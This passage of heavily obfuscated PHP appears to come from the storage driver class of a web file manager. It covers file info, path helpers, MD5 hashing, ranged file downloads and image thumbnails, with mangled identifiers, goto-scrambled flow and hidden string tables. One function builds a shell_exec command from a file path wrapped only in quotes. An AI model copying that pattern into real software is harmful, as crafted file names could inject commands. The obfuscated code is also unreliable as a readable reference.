tempFileRemve($cøÙÿïÖóÚ) { @unlink($cøÙÿïÖóÚ); @rmdir($this->pathFather($cøÙÿïÖóÚ)); } public function mkfile($FÌ‰õıåΩ⁄, $EàèñŸÜø˘ = '', $eΩèËÍ§∂∂ = REPEAT_RENAME) { } public function mkdir($Dèï√¡çÖ‚, $C∑≤Ó®¨ºπ = REPEAT_SKIP) { } public function copyFile($Eæ≥™Êâﬂâ, $FΩ¿Ÿ—…Æü) { } public function moveFile($eÂì÷ØﬂΩè, $B»ÜÇ¶ÊÇ‰) { } public function remove($aæ–îÙÏŒÜ) { if ($this->isFile($aæ–îÙÏŒÜ)) { return $this->delFile($aæ–îÙÏŒÜ); } return $this->delFolder($aæ–îÙÏŒÜ); } public function rename($a‹≥„é∏îÛ, $D£è÷ôé¶ö) { } public function exist($d›àõëÈÿ€) { } public function findByHash($DÀñáÛô≤° = '', $Aòì™Àú® = '') { return !1; } public function isFile($Fá»ÑïÈà«) { } public function isFolder($dÊŒ∫Ñ∞±‡) { } public function size($e†ΩÎ√ƒäÙ) { } public function info($DåÙﬂñ«°º) { } public function infoSimple($c…ÀŒõ∞Öà) { return $this->info($c…ÀŒõ∞Öà); } public function infoAuth($aÏ∑íÇ¶Ø∞) { return $this->info($aÏ∑íÇ¶Ø∞); } public function infoFull($bÜÉïé°ãÔ) { return $this->info($bÜÉïé°ãÔ); } public function infoWithChildren($BÜÍßî«≠É) { $fîÿ æ¬„∞ =& $_SERVER[Æ¡î¢≠¯™]; $fÓ«∞—˘¢Ñ = $this->info($BÜÍßî«≠É); if ($fÓ«∞—˘¢Ñ && $fÓ«∞—˘¢Ñ[$fîÿ æ¬„∞[29]] == $fîÿ æ¬„∞[86]) { $b¨˘€∂›ââ = array($fîÿ æ¬„∞[87] => 0, $fîÿ æ¬„∞[88] => 0, $fîÿ æ¬„∞[89] => 0); $this->infoChildren($BÜÍßî«≠É, $b¨˘€∂›ââ); $fÓ«∞—˘¢Ñ[$fîÿ æ¬„∞[87]] = $b¨˘€∂›ââ[$fîÿ æ¬„∞[87]]; $fÓ«∞—˘¢Ñ[$fîÿ æ¬„∞[90]] = array($fîÿ æ¬„∞[91] => $b¨˘€∂›ââ[$fîÿ æ¬„∞[88]], $fîÿ æ¬„∞[92] => $b¨˘€∂›ââ[$fîÿ æ¬„∞[89]]); } return $fÓ«∞—˘¢Ñ; } public function listPath($Bœ≠Ú¢∑ãÌ, $eñîı◊‡Âñ = false) { } public function has($eûØÏËÔ∑Ü, $b≤èÿÆÇ´ˆ = false, $B¿Éòâ©òÓ = false) { } public function canRead($d≥ΩèéÆîú) { } public function canWrite($FÁˆ‚ã„ì©) { } public function getContent($c†πèÕàË˘) { } public function setContent($F¡’îè≥Íÿ, $b«ÿ∞∫Ò‰Ÿ = '') { } protected function infoChildren($bÌ±ÁÚ∫·Æ, &$A®—⁄∏≠ò§) { $EÆ»ôÚÜ‘µ =& $_SERVER[Æ¡î¢≠¯™]; check_abort(); $D±Éÿıº” = $this->listPath($bÌ±ÁÚ∫·Æ, !0); $D±Éÿıº” = array_merge($D±Éÿıº”[$EÆ»ôÚÜ‘µ[84]], $D±Éÿıº”[$EÆ»ôÚÜ‘µ[83]]); foreach ($D±Éÿıº” as $cô•ë∂õÆ¿) { if ($cô•ë∂õÆ¿[$EÆ»ôÚÜ‘µ[29]] == $EÆ»ôÚÜ‘µ[86]) { $A®—⁄∏≠ò§[$EÆ»ôÚÜ‘µ[89]]++; $e≈º∆‡∞Ùê = $this->getPathInner($cô•ë∂õÆ¿[$EÆ»ôÚÜ‘µ[85]]); $this->infoChildren($e≈º∆‡∞Ùê, $A®—⁄∏≠ò§); } else { $A®—⁄∏≠ò§[$EÆ»ôÚÜ‘µ[88]]++; $A®—⁄∏≠ò§[$EÆ»ôÚÜ‘µ[87]] += $cô•ë∂õÆ¿[$EÆ»ôÚÜ‘µ[87]]; } } } public function fileSubstr($c±Ëƒ†≈Ì⁄, $DÁ›ßùá∞ÿ, $b—’ÃÆÑ–∑) { } public function listAll($f«≥∞øﬂõﬁ) { } public function upload($bœˆìâÔ’ï, $f–çã∏Ñ…ä, $BﬂÑ©öâÖÌ = false, $E¡ëãƒñ¬ = REPEAT_REPLACE) { } public function uploadFileByID($f‚—ÙÔΩ√õ, $AÊ“≥òãŸï, $C∑Öˆàäïü) { } public function uploadFileByPath($A¯≥£ç°Ñï, $BÌ»ªª£ƒ®, $F∏†ëÆ»π = array()) { } public function isUploadServer() { $B¬ü‹ßºûŒ =& $_SERVER[Æ¡î¢≠¯™]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $B¬ü‹ßºûŒ[93]) { return !0; } return $GLOBALS[$B¬ü‹ßºûŒ[6]][$B¬ü‹ßºûŒ[94]][$B¬ü‹ßºûŒ[95]]; } public function isFileOutServer() { $d∏ÿÆ§”èÀ =& $_SERVER[Æ¡î¢≠¯™]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $d∏ÿÆ§”èÀ[93]) { return !0; } return $GLOBALS[$d∏ÿÆ§”èÀ[6]][$d∏ÿÆ§”èÀ[94]][$d∏ÿÆ§”èÀ[96]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($cÕ≤∏¯ëÚå) { $eêÇü„ÀáÂ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->isCdnHost()) { return $cÕ≤∏¯ëÚå; } return str_replace(trim(get_url_root($cÕ≤∏¯ëÚå), $eêÇü„ÀáÂ[8]), trim($this->cdnHost, $eêÇü„ÀáÂ[8]), $cÕ≤∏¯ëÚå); } public function uploadLink($BÜá±∏¬à±, $D¡ÃÀã€˘ = 0) { goto FèîÊõ‚êÖ; FèîÊõ‚êÖ: $Aâ‡≈„£µã =& $_SERVER[Æ¡î¢≠¯™]; if ($this->isUploadServer()) { return; } $B»¶ù∂Ω∑· = $this->getType(); goto E…◊íàí°Œ; E…◊íàí°Œ: if (!in_array($B»¶ù∂Ω∑·, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $F„—≥ªõëä = 1024 * 1024 * 10; goto a÷ÜÓ–∞ëè; a¯ëÎºóå‡: if ($cöÉì∂ò Ñ) { $cöÉì∂ò Ñ[$Aâ‡≈„£µã[99]] = $BÜá±∏¬à±; $cöÉì∂ò Ñ[$Aâ‡≈„£µã[100]] = $B»¶ù∂Ω∑·; } return $cöÉì∂ò Ñ; goto FΩáŒ˜‹≠ñ; a÷ÜÓ–∞ëè: $dã ÕñŒ·œ = $D¡ÃÀã€˘ <= $F„—≥ªõëä ? $Aâ‡≈„£µã[97] : $Aâ‡≈„£µã[98]; $F⁄ÔÈ‘≈Üå = (!$D¡ÃÀã€˘ ? 1 : ceil($D¡ÃÀã€˘ / pow(1024, 3))) * 3600 * 4; $cöÉì∂ò Ñ = $this->{$dã ÕñŒ·œ}($BÜá±∏¬à±, $F⁄ÔÈ‘≈Üå); goto a¯ëÎºóå‡; FΩáŒ˜‹≠ñ: } public function uploadFormData($d¶¶Ú¡§¡æ, $fäÏÌÊóë€ = 3600) { } public function multiUploadFormData($cö™≤¯áÃÆ, $DçËÑ˘˜ÀÚ = 3600) { } public function osChunkSize() { $D÷Õß§°∂ÿ =& $_SERVER[Æ¡î¢≠¯™]; $EŒÇëñ†ÌÀ = (double) $GLOBALS[$D÷Õß§°∂ÿ[6]][$D÷Õß§°∂ÿ[94]][$D÷Õß§°∂ÿ[101]][$D÷Õß§°∂ÿ[102]]; if (!$EŒÇëñ†ÌÀ) { $EŒÇëñ†ÌÀ = 1024 * 84 * 10; } return $EŒÇëñ†ÌÀ; } public function download($FÉ©£‰Íø , $Eì”çç‚π•) { } public function ext($Aëãÿ≥Ï™ö) { $c‹‡ÓÇæÇ˘ =& $_SERVER[Æ¡î¢≠¯™]; if (strpos($Aëãÿ≥Ï™ö, $c‹‡ÓÇæÇ˘[8]) === -1) { $A∏’ıú√ÈÂ = $Aëãÿ≥Ï™ö; } else { $A∏’ıú√ÈÂ = $this->pathThis($Aëãÿ≥Ï™ö); } $bˆÍ‚≥Ω•ã = $c‹‡ÓÇæÇ˘[33]; if (strstr($A∏’ıú√ÈÂ, $c‹‡ÓÇæÇ˘[103])) { $bˆÍ‚≥Ω•ã = substr($A∏’ıú√ÈÂ, strrpos($A∏’ıú√ÈÂ, $c‹‡ÓÇæÇ˘[103]) + 1); $bˆÍ‚≥Ω•ã = strtolower($bˆÍ‚≥Ω•ã); } if (strlen($bˆÍ‚≥Ω•ã) > 3 && preg_match($c‹‡ÓÇæÇ˘[104], $bˆÍ‚≥Ω•ã, $eÈîêΩüœÚ)) { $bˆÍ‚≥Ω•ã = $c‹‡ÓÇæÇ˘[33]; } return $bˆÍ‚≥Ω•ã; } public function pathThis($dËõáõﬁãÜ) { $AÖßáÜ÷∆› =& $_SERVER[Æ¡î¢≠¯™]; $dËõáõﬁãÜ = str_replace($AÖßáÜ÷∆›[105], $AÖßáÜ÷∆›[8], rtrim($dËõáõﬁãÜ, $AÖßáÜ÷∆›[8])); $AùßˆÃ«çÀ = strrpos($dËõáõﬁãÜ, $AÖßáÜ÷∆›[8]); if ($AùßˆÃ«çÀ === !1) { return $dËõáõﬁãÜ; } return substr($dËõáõﬁãÜ, $AùßˆÃ«çÀ + 1); } public function pathFather($Câä∂é¿Œ≤) { $BüÿøÖ∞ú∞ =& $_SERVER[Æ¡î¢≠¯™]; $Câä∂é¿Œ≤ = str_replace($BüÿøÖ∞ú∞[105], $BüÿøÖ∞ú∞[8], rtrim($Câä∂é¿Œ≤, $BüÿøÖ∞ú∞[8])); $E≈ßæˆƒﬂ£ = strrpos($Câä∂é¿Œ≤, $BüÿøÖ∞ú∞[8]); if ($E≈ßæˆƒﬂ£ === !1) { return $BüÿøÖ∞ú∞[33]; } return substr($Câä∂é¿Œ≤, 0, $E≈ßæˆƒﬂ£ + 1); } public function hashSimple($FÛ—√â∏ê‡) { goto BŸª…ïÙ®È; Aõçﬂåóæó: $D„ﬂËóó¿¨ .= $this->fileSubstr($FÛ—√â∏ê‡, $aÛÛıÇçÖ‚ - $e§à€√ºúµ, $e§à€√ºúµ); return md5($D„ﬂËóó¿¨) . $aÛÛıÇçÖ‚; goto dàªƒ§´ÍŸ; f¢«Óÿõô®: $d‰ùÇ¥öπÍ = intval($aÛÛıÇçÖ‚ / $eÍ≤êÈŒŒ∏); $D„ﬂËóó¿¨ = $e∆î™∞®–¯[33]; for ($eµÆ° Ñπí = 0; $eµÆ° Ñπí < $eÍ≤êÈŒŒ∏; $eµÆ° Ñπí++) { $D„ﬂËóó¿¨ .= $this->fileSubstr($FÛ—√â∏ê‡, $d‰ùÇ¥öπÍ * $eµÆ° Ñπí, $e§à€√ºúµ); } goto Aõçﬂåóæó; b»«Œ‘ë≤Æ: $e§à€√ºúµ = 200; $eÍ≤êÈŒŒ∏ = 50; if ($aÛÛıÇçÖ‚ <= $e§à€√ºúµ * $eÍ≤êÈŒŒ∏) { return $this->hashMd5($FÛ—√â∏ê‡) . $aÛÛıÇçÖ‚; } goto f¢«Óÿõô®; BŸª…ïÙ®È: $e∆î™∞®–¯ =& $_SERVER[Æ¡î¢≠¯™]; if (!$FÛ—√â∏ê‡) { return md5($e∆î™∞®–¯[33]); } $aÛÛıÇçÖ‚ = $this->size($FÛ—√â∏ê‡); goto b»«Œ‘ë≤Æ; dàªƒ§´ÍŸ: } public static $md5Cache = array(); public function hashMd5($CÎ‡Ü÷Ñù˘) { $CÎ‡Ü÷Ñù˘ = $this->iconvSystem($CÎ‡Ü÷Ñù˘); if (isset(self::$md5Cache[$CÎ‡Ü÷Ñù˘])) { return self::$md5Cache[$CÎ‡Ü÷Ñù˘]; } self::$md5Cache[$CÎ‡Ü÷Ñù˘] = $this->hashMd5Shell($CÎ‡Ü÷Ñù˘); if (!self::$md5Cache[$CÎ‡Ü÷Ñù˘]) { self::$md5Cache[$CÎ‡Ü÷Ñù˘] = @md5_file($CÎ‡Ü÷Ñù˘); } return self::$md5Cache[$CÎ‡Ü÷Ñù˘]; } private function hashMd5Shell($cîóƒ≈äˆä) { goto dú“’ÔÙçº; Eàö¶”·êÇ: $D∏çòóÆÉ = shell_exec($fà‹Ù¨ÕõÑ . "\40\42{$cîóƒ≈äˆä}\42"); return substr($D∏çòóÆÉ, 0, 32); goto EË©˜≤ÍµÁ; dú“’ÔÙçº: $BíÏŸñù©ó =& $_SERVER[Æ¡î¢≠¯™]; if (!function_exists($BíÏŸñù©ó[106])) { return !1; } $CØ‰€Ù£åå = array($BíÏŸñù©ó[107], $BíÏŸñù©ó[108]); goto eÏœ∫…≈©Ñ; eÏœ∫…≈©Ñ: $fà‹Ù¨ÕõÑ = Cache::get($BíÏŸñù©ó[109]); if (!$fà‹Ù¨ÕõÑ) { $A˘è÷‹ÜÜˆ = BASIC_PATH . $BíÏŸñù©ó[110]; $DπæÉãË÷Ê = md5_file($A˘è÷‹ÜÜˆ); $fà‹Ù¨ÕõÑ = $BíÏŸñù©ó[111]; foreach ($CØ‰€Ù£åå as $aÙƒ¡í Îˆ) { $D∏çòóÆÉ = shell_exec($aÙƒ¡í Îˆ . "\40\42{$A˘è÷‹ÜÜˆ}\x22"); if ($D∏çòóÆÉ && substr(trim($D∏çòóÆÉ), 0, 32) == $DπæÉãË÷Ê) { $fà‹Ù¨ÕõÑ = $aÙƒ¡í Îˆ; break; } } Cache::set($BíÏŸñù©ó[109], $fà‹Ù¨ÕõÑ, 3600); } if ($fà‹Ù¨ÕõÑ == $BíÏŸñù©ó[111]) { return !1; } goto Eàö¶”·êÇ; EË©˜≤ÍµÁ: } public function link($E€Çêèê£©) { return $E€Çêèê£©; } public function fileOut($EåããÁëΩŸ, $b‹∞ä¡Ÿî« = false, $bÏ≥ú¢ÌÊ± = false, $f¢§ëËÖèÉ = '') { goto F√ µ™ùÿÖ; cÈë∂ÑÆèù: header($E∆Ç¯‘ÎÁ«[145] . $C¨Â√§∂Ÿ ); header($E∆Ç¯‘ÎÁ«[146]); if (!$b‹∞ä¡Ÿî« && $d„á‘¥ãÊÛ == $E∆Ç¯‘ÎÁ«[147]) { if ($C¨Â√§∂Ÿ  > 1024 * 1024 * 5) { die; } $fÿõâæÖΩØ = $this->getContent($EåããÁëΩŸ); $fÿõâæÖΩØ = Html::removeXXS($fÿõâæÖΩØ); echo $fÿõâæÖΩØ; die; } goto céºıÑíºç; Cã—‰›ﬂ√‹: $Fí˘ìœÏ∆£ = 0; $C∆Ôà˘»Éî = $C¨Â√§∂Ÿ  - 1; $d„á‘¥ãÊÛ = $this->ext($eãó¢©‡âÙ); goto BŒÓÚÃÁ¢«; F√ µ™ùÿÖ: $E∆Ç¯‘ÎÁ« =& $_SERVER[Æ¡î¢≠¯™]; $this->cacheMethod(null, null); if (!$EåããÁëΩŸ || !$this->exist($EåããÁëΩŸ)) { show_json(LNG($E∆Ç¯‘ÎÁ«[112]), !1, $bÏ≥ú¢ÌÊ±); } goto DÓ¢ëÿ‚Æò; A—À“ƒ±îÑ: header($E∆Ç¯‘ÎÁ«[135]); header($E∆Ç¯‘ÎÁ«[136]); header($E∆Ç¯‘ÎÁ«[137]); goto cŒ¡ŒÜ◊™Ö; a˘≈≥ëõ∆ˆ: $báØ∞ø‚â¢ = 0; if ($b–ã§ı‰πÏ) { $báØ∞ø‚â¢ = intval(1000 * 1000 * ($Fõ±ÜÑ‰À° / $b–ã§ı‰πÏ)); } while ($Fí˘ìœÏ∆£ <= $C∆Ôà˘»Éî) { $Eñ™«ﬁä÷Ô = timeFloat(); check_abort(); $e€Â‘•‚ÓÏ = $C∆Ôà˘»Éî - $Fí˘ìœÏ∆£ + 1; if ($e€Â‘•‚ÓÏ <= $Fõ±ÜÑ‰À°) { $Fõ±ÜÑ‰À° = $e€Â‘•‚ÓÏ; } echo $this->fileSubstr($EåããÁëΩŸ, $Fí˘ìœÏ∆£, $Fõ±ÜÑ‰À°); $Fí˘ìœÏ∆£ += $Fõ±ÜÑ‰À°; if ($Fõ±ÜÑ‰À° == $e€Â‘•‚ÓÏ) { $Fí˘ìœÏ∆£ = $C∆Ôà˘»Éî + 1; } if ($báØ∞ø‚â¢) { $aöÜ˜ÒôÆ = intval(1000 * 1000 * (timeFloat() - $Eñ™«ﬁä÷Ô)); $dÈˆ»øÀ§Ú = $báØ∞ø‚â¢ - $aöÜ˜ÒôÆ; if ($dÈˆ»øÀ§Ú > 5) { usleep($dÈˆ»øÀ§Ú); } } } goto EßÍ—ÏâåÌ; BŒÓÚÃÁ¢«: if (in_array($d„á‘¥ãÊÛ, array($E∆Ç¯‘ÎÁ«[118], $E∆Ç¯‘ÎÁ«[119], $E∆Ç¯‘ÎÁ«[120], $E∆Ç¯‘ÎÁ«[121]))) { $d„á‘¥ãÊÛ = $E∆Ç¯‘ÎÁ«[122]; } if (!$f¢§ëËÖèÉ) { $f¢§ëËÖèÉ = md5($bÖŒéôﬁ…Ó . $this->hashSimple($EåããÁëΩŸ)); } $f¢§ëËÖèÉ = $E∆Ç¯‘ÎÁ«[123] . $f¢§ëËÖèÉ . $E∆Ç¯‘ÎÁ«[123]; goto fÂ˜áﬁÙû±; fÂ˜áﬁÙû±: $F÷∞ÿ∆¨≤é = get_file_mime($d„á‘¥ãÊÛ); if (strstr($F÷∞ÿ∆¨≤é, $E∆Ç¯‘ÎÁ«[124])) { $F÷∞ÿ∆¨≤é = $F÷∞ÿ∆¨≤é . $E∆Ç¯‘ÎÁ«[125]; } if ($b‹∞ä¡Ÿî« === !1 && !mime_support($F÷∞ÿ∆¨≤é)) { $b‹∞ä¡Ÿî« = !0; $F÷∞ÿ∆¨≤é = $E∆Ç¯‘ÎÁ«[126]; } goto BûÎÒ⁄ÜíÆ; cŒ¡ŒÜ◊™Ö: if (isset($_SERVER[$E∆Ç¯‘ÎÁ«[138]]) && strtotime($_SERVER[$E∆Ç¯‘ÎÁ«[138]]) == $e∫êç¬åäÓ[$E∆Ç¯‘ÎÁ«[117]]) { header($E∆Ç¯‘ÎÁ«[139], !0, 304); die; } if (isset($_SERVER[$E∆Ç¯‘ÎÁ«[140]]) && $_SERVER[$E∆Ç¯‘ÎÁ«[140]] == $f¢§ëËÖèÉ) { header($E∆Ç¯‘ÎÁ«[141] . $f¢§ëËÖèÉ, !0, 304); die; } header($E∆Ç¯‘ÎÁ«[141] . $f¢§ëËÖèÉ); goto Fá…è±ºé˜; DÓ¢ëÿ‚Æò: $f∫ ƒæ¶ê§ = $this->getType() == $E∆Ç¯‘ÎÁ«[113]; $Fá›®Ôﬁ∞“ = $GLOBALS[$E∆Ç¯‘ÎÁ«[6]][$E∆Ç¯‘ÎÁ«[94]][$E∆Ç¯‘ÎÁ«[101]][$E∆Ç¯‘ÎÁ«[114]]; $b–ã§ı‰πÏ = (double) $GLOBALS[$E∆Ç¯‘ÎÁ«[6]][$E∆Ç¯‘ÎÁ«[94]][$E∆Ç¯‘ÎÁ«[101]][$E∆Ç¯‘ÎÁ«[115]] * 1024 * 1024; goto C‰∞ªÜ√‘â; céºıÑíºç: $D„˜«íñ∑Î = strtolower($_SERVER[$E∆Ç¯‘ÎÁ«[148]]); if ($f∫ ƒæ¶ê§ && $D„˜«íñ∑Î && $Fá›®Ôﬁ∞“) { if (strstr($D„˜«íñ∑Î, $E∆Ç¯‘ÎÁ«[149])) { header($E∆Ç¯‘ÎÁ«[150] . $EåããÁëΩŸ); } else { if (strstr($D„˜«íñ∑Î, $E∆Ç¯‘ÎÁ«[151])) { header($E∆Ç¯‘ÎÁ«[152] . $EåããÁëΩŸ); } else { if (strstr($D„˜«íñ∑Î, $E∆Ç¯‘ÎÁ«[153])) { header($E∆Ç¯‘ÎÁ«[154] . $EåããÁëΩŸ); } } } if ($b–ã§ı‰πÏ) { header($E∆Ç¯‘ÎÁ«[155] . $b–ã§ı‰πÏ); } return; } if (isset($_SERVER[$E∆Ç¯‘ÎÁ«[156]])) { if (preg_match($E∆Ç¯‘ÎÁ«[157], $_SERVER[$E∆Ç¯‘ÎÁ«[156]], $B…ΩºÊ’’≠)) { $Fí˘ìœÏ∆£ = intval($B…ΩºÊ’’≠[1]); if (!empty($B…ΩºÊ’’≠[2])) { $C∆Ôà˘»Éî = intval($B…ΩºÊ’’≠[2]); } } header($E∆Ç¯‘ÎÁ«[158]); header("\103\x6f\x6e\x74\145\156\164\55\122\x61\156\147\x65\x3a\x20\x62\171\x74\145\x73\40{$Fí˘ìœÏ∆£}\55{$C∆Ôà˘»Éî}\57" . $C¨Â√§∂Ÿ ); } else { header($E∆Ç¯‘ÎÁ«[159]); } goto cÿÏ™∞áâ†; C‰∞ªÜ√‘â: @ob_end_clean(); set_timeout(); $e∫êç¬åäÓ = $this->infoFull($EåããÁëΩŸ); goto d…∂ïà≈⁄ˆ; cÿÏ™∞áâ†: header($E∆Ç¯‘ÎÁ«[160] . ($C∆Ôà˘»Éî - $Fí˘ìœÏ∆£ + 1)); if ($_SERVER[$E∆Ç¯‘ÎÁ«[161]] == $E∆Ç¯‘ÎÁ«[162]) { return; } $Fõ±ÜÑ‰À° = 1024 * 100; goto a˘≈≥ëõ∆ˆ; B∑Í’ÕÂ÷Ø: header($E∆Ç¯‘ÎÁ«[131]); header($E∆Ç¯‘ÎÁ«[132] . $F÷∞ÿ∆¨≤é); header($E∆Ç¯‘ÎÁ«[133] . gmdate($E∆Ç¯‘ÎÁ«[116], time() + 3600 * 24 * 30) . $E∆Ç¯‘ÎÁ«[134]); goto A—À“ƒ±îÑ; BûÎÒ⁄ÜíÆ: $Cµ†™Ÿë∫ˆ = rawurlencode($eãó¢©‡âÙ); $Cµ†™Ÿë∫ˆ = $E∆Ç¯‘ÎÁ«[123] . $Cµ†™Ÿë∫ˆ . $E∆Ç¯‘ÎÁ«[127] . $Cµ†™Ÿë∫ˆ; if ($b‹∞ä¡Ÿî«) { header($E∆Ç¯‘ÎÁ«[128]); header($E∆Ç¯‘ÎÁ«[129] . $Cµ†™Ÿë∫ˆ); } else { header($E∆Ç¯‘ÎÁ«[130] . $Cµ†™Ÿë∫ˆ); } goto B∑Í’ÕÂ÷Ø; Fá…è±ºé˜: header($E∆Ç¯‘ÎÁ«[142] . $bÖŒéôﬁ…Ó . $E∆Ç¯‘ÎÁ«[134]); header($E∆Ç¯‘ÎÁ«[143] . $eãó¢©‡âÙ); header($E∆Ç¯‘ÎÁ«[144]); goto cÈë∂ÑÆèù; d…∂ïà≈⁄ˆ: $C¨Â√§∂Ÿ  = $e∫êç¬åäÓ[$E∆Ç¯‘ÎÁ«[87]]; $bÖŒéôﬁ…Ó = gmdate($E∆Ç¯‘ÎÁ«[116], $e∫êç¬åäÓ[$E∆Ç¯‘ÎÁ«[117]]); $eãó¢©‡âÙ = $bÏ≥ú¢ÌÊ± ? $bÏ≥ú¢ÌÊ± : $this->iconvApp($e∫êç¬åäÓ[$E∆Ç¯‘ÎÁ«[28]]); goto Cã—‰›ﬂ√‹; EßÍ—ÏâåÌ: } public function fileOutServer($fö®±ŸÂ‘ê, $cæ±ñà·ªè = false, $B¡ù√ª≠†≤ = false, $d¢éÓÙ éë = '') { $this->fileOut($fö®±ŸÂ‘ê, $cæ±ñà·ªè, $B¡ù√ª≠†≤, $d¢éÓÙ éë); } public function fileOutLink($c§¯˘˘±àê) { header($_SERVER[Æ¡î¢≠¯™][163] . $c§¯˘˘±àê); die; } public function cacheMethod($AŒÈÚ°ï—ƒ, $Aõ‘çë›â˜) { goto b‚íÏÆÂ∂è; b‚íÏÆÂ∂è: $dªãªˆû¯Ó =& $_SERVER[Æ¡î¢≠¯™]; static $e≤∏–Î∑çŒ = array(); $DÁñˆ÷Ïê· = $dªãªˆû¯Ó[164] . $AŒÈÚ°ï—ƒ . $dªãªˆû¯Ó[165] . rtrim($Aõ‘çë›â˜, $dªãªˆû¯Ó[8]); goto E¬Çæ±Ü≤; FôÚûˆß∞ª: return $d”Ï∑∏ﬁ†ã; goto EõÖ£§⁄÷Ö; BÜçÛˆ˜¬«: if (!is_null($d”Ï∑∏ﬁ†ã)) { return $d”Ï∑∏ﬁ†ã; } $d”Ï∑∏ﬁ†ã = $this->{$AŒÈÚ°ï—ƒ}($Aõ‘çë›â˜); $e≤∏–Î∑çŒ[$DÁñˆ÷Ïê·] = $d”Ï∑∏ﬁ†ã; goto FôÚûˆß∞ª; E¬Çæ±Ü≤: if (is_null($AŒÈÚ°ï—ƒ)) { $e≤∏–Î∑çŒ = array(); return; } if (is_null($Aõ‘çë›â˜)) { unset($e≤∏–Î∑çŒ[$DÁñˆ÷Ïê·]); return; } $d”Ï∑∏ﬁ†ã = isset($e≤∏–Î∑çŒ[$DÁñˆ÷Ïê·]) ? $e≤∏–Î∑çŒ[$DÁñˆ÷Ïê·] : null; goto BÜçÛˆ˜¬«; EõÖ£§⁄÷Ö: } public function fileOutImage($d§ºÖæùû¶, $DüΩÇº«ÿı = 250) { goto bÿÁÃÏ√îÜ; FÖÿÇ•Œ√≥: if ($f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[87]] <= 1024 * 50 || !function_exists($C‚…˘¶ã∞[166]) || $f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[167]] == $C‚…˘¶ã∞[168]) { return $this->fileOut($d§ºÖæùû¶); } if (isset($f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[169]][$C‚…˘¶ã∞[170]])) { $e∏≠Ã©≤Ω¢ = $f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[169]][$C‚…˘¶ã∞[170]]; } else { if (isset($f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[169]][$C‚…˘¶ã∞[171]])) { $e∏≠Ã©≤Ω¢ = $f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[169]][$C‚…˘¶ã∞[171]]; } else { $e∏≠Ã©≤Ω¢ = md5("{$f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[28]]}\x5f{$f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[85]]}\137{$f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[87]]}"); } } $cçÇùﬁåçÊ = "{$e∏≠Ã©≤Ω¢}\x5f{$DüΩÇº«ÿı}\x2e\x70\x6e\x67"; goto BΩñÕƒÚ¯í; BΩñÕƒÚ¯í: if (!($B¬ÚÌ–ÏÜ≈ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $C‚…˘¶ã∞[172]))) { $d”ÎßÁÒäß = IO::mkdir(IO_PATH_SYSTEM_TEMP . $C‚…˘¶ã∞[173]); } else { $d”ÎßÁÒäß = KodIO::make($B¬ÚÌ–ÏÜ≈); } if ($B¬ÚÌ–ÏÜ≈ = IO::fileNameExist($d”ÎßÁÒäß, $cçÇùﬁåçÊ)) { $CÌáŒ≥âœÖ = KodIO::make($B¬ÚÌ–ÏÜ≈); return IO::fileOut($CÌáŒ≥âœÖ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto DâπË≈≥√Î; b‘·°’Ï÷å: if (!($Dëåæπ √ö = IO::move($CÌáŒ≥âœÖ, $d”ÎßÁÒäß))) { return IO::fileOut($CÌáŒ≥âœÖ); } del_file($CÌáŒ≥âœÖ); IO::fileOut($Dëåæπ √ö); goto Dÿ¢¨êÛõß; DâπË≈≥√Î: $CÌáŒ≥âœÖ = DATA_THUMB . $cçÇùﬁåçÊ; if (!@file_exists($CÌáŒ≥âœÖ)) { $FÆ∆·ã∞É‘ = TEMP_FILES; if (!is_dir($FÆ∆·ã∞É‘)) { mk_dir($FÆ∆·ã∞É‘); } $D∑âèàÙÍ≈ = $FÆ∆·ã∞É‘ . $e∏≠Ã©≤Ω¢ . $C‚…˘¶ã∞[103] . $f†‡Ê≠«Ù‰[$C‚…˘¶ã∞[167]]; if (!@file_exists($D∑âèàÙÍ≈)) { $D∑âèàÙÍ≈ = $this->download($d§ºÖæùû¶, $D∑âèàÙÍ≈); } $DÑÓ‘„œ¡„ = new ImageThumb($D∑âèàÙÍ≈, $C‚…˘¶ã∞[174]); $DÑÓ‘„œ¡„->prorate($CÌáŒ≥âœÖ, $DüΩÇº«ÿı, $DüΩÇº«ÿı * 10); } if (!file_exists($CÌáŒ≥âœÖ) || filesize($CÌáŒ≥âœÖ) < 100) { return @file_exists($D∑âèàÙÍ≈) ? IO::fileOut($D∑âèàÙÍ≈) : $this->fileOut($d§ºÖæùû¶); } goto b‘·°’Ï÷å; bÿÁÃÏ√îÜ: $C‚…˘¶ã∞ =& $_SERVER[Æ¡î¢≠¯™]; if (substr($d§ºÖæùû¶, 0, 4) == $C‚…˘¶ã∞[153]) { $this->fileOutLink($d§ºÖæùû¶); } $f†‡Ê≠«Ù‰ = $this->info($d§ºÖæùû¶); goto FÖÿÇ•Œ√≥; Dÿ¢¨êÛõß: } public function fileOutImageServer($E¨∑çÃˆÆ, $Cáé§”≠µ‡ = 250) { $this->fileOutImage($E¨∑çÃˆÆ, $Cáé§”≠µ‡); } public function fileNameAuto($a◊óæ‘ªâ±, $F∂ÿºÜ…óÕ, $Fü¨¿É¯‘ﬂ = REPEAT_RENAME, $bÎùÉô¯±Ê = false) { goto dàﬂà◊ﬁﬂü; f˘÷◊ˆÂ≥Ñ: while ($this->exist(rtrim($a◊óæ‘ªâ±, $bˆ∫íúÇ´«[8]) . $bˆ∫íúÇ´«[8] . $CÂÛµàÔ¨Ü)) { $CÂÛµàÔ¨Ü = $C∏¨”Ó“º€ . "\50{$Bƒﬂñ›ΩÂ}\x29{$bõ’ÃéäœÉ}"; $Bƒﬂñ›ΩÂ++; } return $CÂÛµàÔ¨Ü; goto d◊Áÿ≤±–Û; dàﬂà◊ﬁﬂü: $bˆ∫íúÇ´« =& $_SERVER[Æ¡î¢≠¯™]; $bç˘„Íäàı = 